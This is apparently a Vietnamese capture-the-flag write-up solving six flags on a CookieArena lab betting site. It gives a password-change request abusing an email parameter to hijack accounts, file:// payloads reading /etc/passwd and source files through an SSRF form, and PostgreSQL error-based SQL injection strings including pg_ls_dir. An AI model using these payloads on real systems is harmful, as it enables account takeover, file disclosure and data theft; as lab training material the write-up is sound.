---
share_link: https://share.note.sx/eappcnfk#vU2uzFOtFTpSeIJMGukLj9RtycFCVQT2a0fv3FsDqlQ
share_updated: 2026-01-20T13:19:50+07:00
---

# TL;DR

- Gồm 6 chall tương ứng với 6 flag
- Khởi động [K10FE Start Me Now](https://battle.cookiearena.org/arenas/final-exam-0x10/battle/k10fe-start-me-now) để lấy web và khởi động các chall còn lại để submit flag
- Mỗi chall sẽ có hướng giải được gợi ý ngay description

---
# Flag 1

## Description
```
FLAG 1 nằm trong lịch sử giao dịch của Bob. Hãy tìm cách chiếm tài khoản của đối tượng này
```

## Initial reconnaissance

Giao diện đầu tiên khi người dùng đăng kí và đăng nhập thành công như sau:

![[Pasted image 20260120092232.png]]

Thử nhấn vào `Comments` ta sẽ thấy các bình luận của người dùng về trận bóng đó:

![[Pasted image 20260120092341.png]]

Ngay ở trận đấu đầu tiên ta đã thấy người dùng `bob` (người mà mình cần tìm cách chiếm tài khoản theo description) và khai thác được email của `bob` là `bob@better.com`

Các bình luận ở các trận đấu tiếp theo có vẻ là cũng không có gì đặc biệt mình mò tiếp đến `Your Account`

![[Pasted image 20260120092601.png]]

Ở đây có vài thông tin nhưng mình sẽ đi thẳng vào mục `Change Password`

![[Pasted image 20260120092726.png]]

Ta có một giao diện đổi mật khẩu tài khoản cơ bản

Đến đây mình nghĩ có thể web sẽ cấu hình lỗi cho phép người dùng đổi mật khẩu của người dùng tùy ý do đây là bài có tag very easy

Ngay sau đó mình thử bắt bằng burp suite thì có request như sau:

![[Pasted image 20260120092939.png]]


## Exploit and get flag

Quả thực trong phần body của request có param `email` nên mình thử đổi thành email của `bob`

```HTTP
POST /user/changePasswd.php HTTP/1.1
Host: 103.97.125.56:32128
Content-Length: 61
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://103.97.125.56:32128
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://103.97.125.56:32128/user/changePasswd.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=adb9a9b41b9d01d65f9aef39a62a624d
Connection: keep-alive

newPassword=1&confirmPassword=1&email=bob%40better.com&submit=
```

Và sau đó đăng nhập bằng email của `bob` với mật khẩu vừa đổi là đã thành công truy cập được vào tài khoản của `bob`

Sau đấy chỉ cần vào phần lịch sử giao dịch (`Transaction`) của `bob` để lấy flag thôi

![[Pasted image 20260120093258.png]]

**FLAG 1**: `CHH{n0_on3_c4n_cH4n6e_y0_pAs5}`

---

# Flag 2

## Description:

```
Trò chơi Sock Deer có gì đó mờ ám. Hãy tìm cách đọc File taixiu để vạch trần trò lừa đảo này và lấy FLAG 2.

Trước khi tiến hành khai thác, hãy thử tìm kiếm thông tin về các file nhạy cảm bằng cách chạy dirsearch - công cụ có sẵn trên Kali Cú pháp: dirsearch
```

## Initial reconnaissance

Làm theo description, mình thử dirseach và có kết quả như sau:

![[Pasted image 20260120093533.png]]

Trong đó có các đường dẫn sau là truy cập được

```
/config.php
/header.php
/info.php
/login.php
/register.php
/test.php
```

Thử truy cập vào từng cái thì `/test.php` cho ra thông tin rất quan trọng

![[Pasted image 20260120093845.png]]

```
/www |-- /www/admin | |-- /www/admin/adminHistory.php | |-- /www/admin/configMatches.php | `-- /www/admin/searchUser.php |-- /www/config.php |-- /www/css | `-- /www/css/style.css |-- /www/deposit.php |-- /www/football_data.json |-- /www/header.php |-- /www/images | |-- /www/images/avt.jpg | |-- /www/images/dice1.png | |-- /www/images/dice2.png | |-- /www/images/dice3.png | |-- /www/images/dice4.png | |-- /www/images/dice5.png | |-- /www/images/dice6.png | `-- /www/images/samuel.png |-- /www/index.php |-- /www/info.php |-- /www/login.php |-- /www/matches.php |-- /www/register.php |-- /www/taixiu88.php |-- /www/test.php |-- /www/transaction.php |-- /www/user | |-- /www/user/account.php | `-- /www/user/changePasswd.php `-- /www/withdraw.php 4 directories, 27 files
```

Kết quả là cấu trúc thư mục của cả trang web

Mình chú ý ngay đến những file php ở sau thư mục `admin`:

```
/www/admin/adminHistory.php
/www/admin/configMatches.php
/www/admin/searchUser.php
```

Thử truy cập từng cái thì có kết quả như sau:

- `/www/admin/adminHistory.php`: Tự redirect về `http://103.97.125.56:32128/index.php?f=matches`

- `/www/admin/configMatches.php`:  ![[Pasted image 20260120094351.png]]

	- Không rõ chính xác cái `Football API` ở đây là gì nhưng khi mình thử nhập một url bất kì vào ô điền và nhấn `Fetch Data` thì trang web sẽ fetch toàn bộ nội dung của trang web đó
	- Ví dụ với trang `example.com`: ![[Pasted image 20260120094557.png]]


- `/www/admin/searchUser.php`: ![[Pasted image 20260120094653.png]]
	- Trang web liệt kê toàn bộ tên người dùng trong database, công dụng của trang web này sẽ được mình động tới ở phần sau


## Exploit and get flag

Ở `admin/configMatches.php` ô nhập liệu cho phép nhập một url bất kì cho nên mình nghĩ ngay đến việc sử dụng giao thức `file://` để đọc nội dung của một file bất kì

Cơ sở cho điều này là việc mình đã dump được toàn bộ cấu trúc của trang web ở `/test.php`

Mà trong phần description tác giả có gợi ý là đọc file `taixiu` mà thực tế kết quả trong `/test.php` trả về là `taixiu88.php` nên mình tiến hành đọc file này đầu tiên

Kết quả khi nhập `file:///www/taixiu88.php` (đã làm đẹp) là:

```php
<?php

session_start();

include('config.php');

if (isset($_SESSION['username'])) {

    header('Location: login.php');

}

function stringToMorse($str)

{

    $morseCode = array('A' => '.-', 'B' => '-...', 'C' => '-.-.', 'D' => '-..', 'E' => '.', 'F' => '..-.', 'G' => '--.', 'H' => '....', 'I' => '..', 'J' => '.---', 'K' => '-.-', 'L' => '.-..', 'M' => '--', 'N' => '-.', 'O' => '---', 'P' => '.--.', 'Q' => '--.-', 'R' => '.-.', 'S' => '...', 'T' => '-', 'U' => '..-', 'V' => '...-', 'W' => '.--', 'X' => '-..-', 'Y' => '-.--', 'Z' => '--..', '1' => '.----', '2' => '..---', '3' => '...--', '4' => '....-', '5' => '.....', '6' => '-....', '7' => '--...', '8' => '---..', '9' => '----.', '0' => '-----', '.' => '.-.-.-', ',' => '--..--', '?' => '..--..', '/' => '-..-.-');

    $result = "";

    $str = strtoupper($str);

    // Convert string to uppercase for case-insensitive matching

    for ($i = 0; $i < strlen($str); $i++) {

        $char = $str[$i];

        if (isset($morseCode[$char])) {

            $result .= $morseCode[$char] . " ";

        } else {

            $result .= "/" . " ";

        }

    }

    return trim($result);

}

$flag2 = "CHH{LFI_Us1nG_Th3_sAm3_lAnGua9e}";

$cleanedStr = preg_replace('/^CHH\{(.*)\}/', '$1', $flag2);

$cleanedStr = str_replace('_', ' ', $cleanedStr);

$morseCode = stringToMorse($cleanedStr);

$customTimezone = new DateTimeZone('+07:00');

$dateTime = new DateTime('NOW', $customTimezone);

$unixTime = $dateTime->getTimestamp();

$randomIndex = substr($unixTime, -2);

if (isset($morseCode[$randomIndex])) {

    if ($morseCode[$randomIndex] == '.') {

        $code = 'small';

    } elseif ($morseCode[$randomIndex] == '-') {

        $code = 'big';

    } else {

        $code = 'random';

    }

}

function getDiceRoll($code)

{

    $dice = [];

    switch ($code) {

        case 'big':

            do {

                $dice[0] = rand(1, 6);

                $dice[1] = rand(1, 6);

                $dice[2] = rand(1, 6);

                $total = array_sum($dice);

            } while ($total <= 9);

            break;

        case 'small':

            do {

                $dice[0] = rand(1, 6);

                $dice[1] = rand(1, 6);

                $dice[2] = rand(1, 6);

                $total = array_sum($dice);

            } while ($total > 9);

            break;

        case 'random':

            $dice[0] = rand(1, 6);

            $dice[1] = rand(1, 6);

            $dice[2] = rand(1, 6);

            break;

        default:

            $dice = [1, 1, 1];

            break;

    }

    return $dice;

}

$diceRolls = getDiceRoll($code);

if (isset($_POST['bet-type'])) {

    if ($_POST['bet-amount'] > 0 && $_POST['bet-amount'] <= $_SESSION['balance']) {

        if (array_sum($diceRolls) > 9) {

            if ($_POST['bet-type'] = 'big') {

                $_SESSION['balance'] += $_POST['bet-amount'];

            } else {

                $_SESSION['balance'] -= $_POST['bet-amount'];

            }

        } elseif (array_sum($diceRolls) <= 9) {

            if ($_POST['bet-type'] = 'big') {

                $_SESSION['balance'] -= $_POST['bet-amount'];

            } else {

                $_SESSION['balance'] += $_POST['bet-amount'];

            }

        }

    } else {

        echo '<script>alert("Invalid amount")</script>';

    }

    $updateBalance = "UPDATE users SET balance=$1 WHERE username=$2";

    $ppstBalance = pg_prepare($conn, "Withdraw", $updateBalance);

    $dataBalance = pg_execute($conn, "Withdraw", array($_SESSION['balance'], $_SESSION['username']));

}

?>

<!DOCTYPE html>

<html lang="en">

  

<head> <?php include('header.php') ?>

    <meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Sock Deer Game</title>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/css/bootstrap.min.css">

    <style>

        body {

            background-color: #f8f9fa;

            padding-top: 50px;

            text-align: center;

        }

  

        #title {

            margin-bottom: 20px;

        }

  

        .container {

            padding-top: 100px;

        }

  

        .dice-area {

            margin: 20px 0;

        }

  

        .dice {

            width: 100px;

            height: 100px;

            margin: 0 10px;

        }

  

        .bet {

            margin: 20px 0;

        }

  

        .betType button {

            margin: 5px;

        }

  

        .btn-primary {

            width: 100%;

        }

    </style>

</head>

  

<body>

    <div class="container">

        <h1 id="title">SOCK DEER</h1>

        <div class="dice-area"> <img class="dice" src="images/dice<?= $diceRolls[0] ?>.png" alt="Dice 1"> <img class="dice" src="images/dice<?= $diceRolls[1] ?>.png" alt="Dice 2"> <img class="dice" src="images/dice<?= $diceRolls[2] ?>.png" alt="Dice 3"> </div>

        <p id="total">Place your bet and roll the dice!</p>

        <p>Your Tokens: <span id="token-count"><?= $_SESSION['balance'] ?></span></p>

        <div class="bet">

            <form method="POST">

                <p>Bet: <input type="number" id="bet-amount" name="bet-amount" class="form-control" value="1" min="1" max="<?= $_SESSION['token'] ?>"> </p>

                <div class="betType"> <button class="btn btn-primary" name="bet-type" value="big">Big</button> <button class="btn btn-primary" name="bet-type" value="small">Small</button> </div>

            </form>

        </div>

    </div>

</body>

  

</html>
```


Bỏ qua cách mà kết quả bet hoạt động, ta lấy được luôn flag 2 ở trong đó

**Flag 2**: `CHH{LFI_Us1nG_Th3_sAm3_lAnGua9e}`

---

# Flag 3

## Description

```
FLAG 3 nằm trong Profile của tài khoản admin. Hãy tìm cách chiếm tài khoản của admin và đọc FLAG
```

## Exploit and get flag (Unintended)

Lấy lại kết quả từ trước, cụ thể là ở trang `/admin/searchUser.php`:

![[Pasted image 20260120100147.png]]

Ta có thể thấy rõ ràng email của `admin` là `housefemale@redfish88.vip` cho nên chỉ cần khai thác tương tự như khi lấy flag 1 là sẽ được flag 3

**Flag 3**: `CHH{XSS_t0_St3Al_4dm1n_s3cre4T}`

## Exploit and get flag (Intended)

Flag lấy được bằng cách trên gợi ý rằng mình phải dùng XSS để lấy session của admin.

Dù đã cố hết sức nhưng mình vẫn không tìm ra được hướng nào để con bot đọc được payload của mình.

Dưới đây là toàn bộ thông tin mình thu thập được:

- Những chỗ mình có thể chèn được payload XSS:
	- Comment ở các trận đấu trong api `/index.php?f=matches`
	- Message khi nạp tiền ở api `/index.php?f=deposit`
	- `Profile Status`
- Tên `user` tối đa là 50 kí tự (không đủ chèn payload XSS)
- Bot khả năng cao sẽ chỉ đọc các yêu cầu `withdraw` nhưng mình không có cách nào để chỉnh được `message`
- Web host ở `127.0.0.1:6969` (thấy được ở `admin/configMatches.php`) không giống với của chall. Cụ thể trong `withdraw.php`:
	- ```php
		$insertHistory = "INSERT INTO transaction(type, amount,
		username, message, state) VALUES($1, $2, $3, $4, $5)";
		$ppstHistory = pg_prepare($conn, "CheckHistory", $insertHistory);
		$dataHistory = pg_execute($conn, "CheckHistory", array($type,
		$withdraw, $user, 'withdraw at redfish88', $state));
		shell_exec('curl http://127.0.0.1:6969/stupid_bot');
		echo '<script>alert("Wait for admin to approve")</script>';
	  ```
	- Tuy có dòng `http://127.0.0.1:6969/stupid_bot` nhưng khi thử tìm qua `admin/configMatches.php` thì không có file nào tên là `stupid_bot`
- Khi lấy được acc của `admin` (bằng cách unintended trên) thì có thể truy cập vào `admin/adminHistory.php` 
	- Trang này lưu mọi thao tác `deposit` và `withdraw` của toàn bộ user và trigger được XSS 
	- Nhưng không có cách nào để con bot render ra trang đó cả, nếu đưa vào `admin/configMatches.php` thì trang web sẽ đơ một hồi lâu rồi cũng chẳng có gì xảy ra cả

Sẽ nghiên cứu thêm :(


---


# Flag 4

## Description

```
FLAG 4 nằm ở trong file **/etc/passwd**. Hãy tìm cách để đọc nội dung file này và lấy FLAG
```

## Exploit and get flag

Giải y hệt như flag 2 là được

**Payload**:

```
file:///etc/passwd
```

![[Pasted image 20260120123004.png]]

**Flag 4**: `CHH{SSRF_aR3_v3ry_d4n6eR0u5_to0}`

---

# Flag 5

## Description

```
FLAG 5 nằm trong cơ sở dữ liệu của hệ thống. Hãy tìm cách khai thác và lấy FLAG
```

## Initial reconnaissance

Description lần này khả năng cao là muốn ta khai thác lỗ hổng `sql injection`

Thông qua nhưng api lấy được trong `test.php` thì `/www/admin/searchUser.php` khả năng cao sẽ là cái dễ dính lỗi này nhất

Dump toàn bộ nội dung file bằng `admin/configMatches.php` ta được:

**searchUser.php** (đã làm đẹp):

```php
<?php include('../config.php'); ?>
<!DOCTYPE html>
<html lang="en">

<head> <?php include('../header.php') ?>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Search</title> <!-- Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>
    <div class="container mt-5" style="padding-top:100px">
        <h1 class="mb-4">Search User</h1>
        <form action="searchUser.php" method="post" class="form-inline mb-4">
            <div class="form-group mr-2"> <label for="search" class="sr-only">Search User:</label> <input type="text"
                    name="search" id="search" class="form-control" placeholder="Enter username"> </div> <button
                type="submit" name="submit" class="btn btn-primary">Search</button>
        </form> <?php if (isset($_POST['submit']) && !empty($_POST['search'])) {
            $search = $_POST['search'];
            $sql = "SELECT * FROM users WHERE username LIKE '%" . $search . "%'";
            $data = pg_query($conn, $sql);
            if (pg_num_rows($data) > 0) {
                echo '<table class="table table-bordered">';
                echo '<thead class="thead-dark">';
                echo '<tr><th>Username</th><th>Email</th><th>Role</th><th>Balance</th></tr>';
                echo '</thead>';
                echo '<tbody>';
                while ($row = pg_fetch_assoc($data)) {
                    echo "<tr><td>" . $row['username'] . "</td><td>" . $row['email'] . "</td><td>" . $row['role'] . "</td><td>" . $row['balance'] . "</td></tr>";
                }
                echo '</tbody>';
                echo '</table>';
            } else {
                echo '<p class="alert alert-warning">No users found matching your search.</p>';
            }
        } ?>
        <h2 class="mt-5">All Users</h2>
        <?php $sql = "SELECT * FROM users";
        $data = pg_query($conn, $sql);
        if (pg_num_rows($data) > 0) {
            echo '<table class="table table-bordered">';
            echo '<thead class="thead-dark">';
            echo '<tr><th>Username</th><th>Email</th><th>Role</th><th>Balance</th></tr>';
            echo '</thead>';
            echo '<tbody>';
            while ($row = pg_fetch_assoc($data)) {
                echo "<tr><td>" . $row['username'] . "</td><td>" . $row['email'] . "</td><td>" . $row['role'] . "</td><td>" . $row['balance'] . "</td></tr>";
            }
            echo '</tbody>';
            echo '</table>';
        } else {
            echo '<p class="alert alert-warning">No users found in the system.</p>';
        } ?>
    </div> <!-- Bootstrap JS and dependencies -->
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>

</html>
```

Đúng là có lỗ hổng ở

```php
$sql = "SELECT * FROM users WHERE username LIKE '%" . $search . "%'";
$data = pg_query($conn, $sql);
```

Tiện lợi hơn ở chỗ khi gặp lỗi, mọi thứ sẽ được in ra màn hình luôn nên ta hướng đến việc khai thác theo hướng `Error based`

![[Pasted image 20260120125859.png]]

## Exploit and get flag

Qua lỗi và các source code mình đã phân tích từ trước có thể dễ dàng thấy ngôn ngữ truy vấn được sử dụng là `postgresql`

Sau khi tìm trên [PayloadAllTheThings](![[Pasted image 20260120130021.png]]) thì mình có payload sau:

```
' AND (SELECT <sth> LIMIT 1 OFFSET <x>)::int=1 --
```

Với:
- `<sth>`: Thông tin cần lấy
- `<x>`: kết quả thứ x (do chỉ lấy được một cái một lần)

Trước hết mình thử truy vết các bảng:

```
' AND (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET <x>)::int=1 --
```

Thử với các giá trị của x thì mình được kết quả sau:

```
users
comments
transaction
flag_5
```

Vậy là flag nằm ở bảng `flag_5` việc còn lại chỉ lấy nó ra thôi

**Payload**:

```
' AND (SELECT * from flag_5)::int=1 -- -
```

**Flag 5**: `CHH{v3ry_s1mpl3_SQL_1nj3cti0n}`


---

# Flag 6

## Description

```
FLAG 6 xuất hiện khi các bạn RCE được hệ thống và đọc file /flag*.txt.
```


## Exploit and get flag (Unintended)

Lý do mà mình bảo đây là cách unintended là bởi vì mình chưa thực sự đạt được RCE mà chỉ lợi dụng việc `postgresql` có hàm với chức năng tượng tự `ls` để đọc tên của file flag rồi đọc nội dung của nó bằng LFI (api `admin/configMatches.php`)

Hàm được nói đến ở đây là `pg_ls_dir()`, thêm vào cấu trúc của payload như ở `flag 5` ta có
```
' AND (select pg_ls_dir('/') LIMIT 1 OFFSET <x>)::int=1 -- -
```

Thử các giá trị của `<x>` thì ở `x = 20` ta đã có được tên của flag

![[Pasted image 20260120131526.png]]

`flag5LyNM.txt`

Việc còn lại chỉ là đọc nó bằng `admin/configMatches.php` thôi

`file:///flag5LyNM.txt`

![[Pasted image 20260120131641.png]]

**Flag 6**: `CHH{Th3_w3B_hA5_Be3N_pwn3d_942b67442290255fc0cc8c928abf883b}`

## Exploit and get flag (Intended)

Trong trang [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution) có mục `PostgreSQL Command Execution` nhưng khi mình thử các payload trong đó thì chưa có cái nào hoạt động cả

Sẽ nghiên cứu thêm ^^







